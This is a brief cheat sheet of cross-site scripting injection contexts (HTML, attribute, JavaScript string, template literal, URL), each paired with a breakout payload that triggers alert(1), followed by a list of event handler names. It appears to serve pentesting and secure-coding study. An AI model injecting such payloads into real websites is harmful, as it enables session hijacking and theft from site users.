# XSS Contexts

## HTML Context

Example:

<p>INPUT</p>

Payload:

<img src=1 onerror=alert(1)>

---

## Attribute Context

Example:

<input value="INPUT">

Payload:

" autofocus onfocus=alert(1) x="

---

## JavaScript String

Example:

var x='INPUT'

Payload:

';alert(1);//

---

## Template Literals

Example:

`INPUT`

Payload:

${alert(1)}

---

## URL Context

javascript:alert(1)

---

## Event Handlers

onclick

onmouseover

onfocus

onanimationstart